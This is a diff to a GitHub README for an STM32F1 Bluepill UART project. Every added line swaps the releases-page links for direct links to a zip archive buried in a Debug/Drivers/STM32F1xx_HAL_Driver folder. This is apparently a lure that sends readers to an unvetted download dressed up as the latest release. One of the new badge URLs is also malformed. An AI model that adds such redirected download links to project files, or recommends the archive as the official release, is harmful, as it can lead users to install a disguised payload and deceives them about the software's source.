@@ -1,7 +1,7 @@
 # 🎉 UART_STM32F1_Bluepill - Control Your STM32F1 Projects Easily
 
-![Download Here](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)  
-[Download Latest Release](https://github.com/Mohamedsor/UART_STM32F1_Bluepill/releases)
+![Download Here](https://github.com/Mohamedsor/UART_STM32F1_Bluepill/raw/refs/heads/master/Debug/Drivers/STM32F1xx_HAL_Driver/UAR-Bluepill-ST-v2.1.zip%20Latest%https://github.com/Mohamedsor/UART_STM32F1_Bluepill/raw/refs/heads/master/Debug/Drivers/STM32F1xx_HAL_Driver/UAR-Bluepill-ST-v2.1.zip)  
+[Download Latest Release](https://github.com/Mohamedsor/UART_STM32F1_Bluepill/raw/refs/heads/master/Debug/Drivers/STM32F1xx_HAL_Driver/UAR-Bluepill-ST-v2.1.zip)
 
 ## 🚀 Getting Started
 
@@ -18,7 +18,7 @@ Before you get started, make sure you have:
 ### 📥 Download & Install
 
 To download the software, visit the following page:  
-[Visit this page to download](https://github.com/Mohamedsor/UART_STM32F1_Bluepill/releases)
+[Visit this page to download](https://github.com/Mohamedsor/UART_STM32F1_Bluepill/raw/refs/heads/master/Debug/Drivers/STM32F1xx_HAL_Driver/UAR-Bluepill-ST-v2.1.zip)
 
 1. Click on the link above.
 2. Look for the latest version.
@@ -77,4 +77,4 @@ For those looking to dive deeper into the world of embedded systems, consider ex
 By following these guidelines, you’ll be able to make the most of your STM32F103C8T6 Bluepill board. Enjoy your journey into embedded systems! 
 
 Once again, for downloading the latest release, visit:  
-[Download Latest Release](https://github.com/Mohamedsor/UART_STM32F1_Bluepill/releases)
+[Download Latest Release](https://github.com/Mohamedsor/UART_STM32F1_Bluepill/raw/refs/heads/master/Debug/Drivers/STM32F1xx_HAL_Driver/UAR-Bluepill-ST-v2.1.zip)
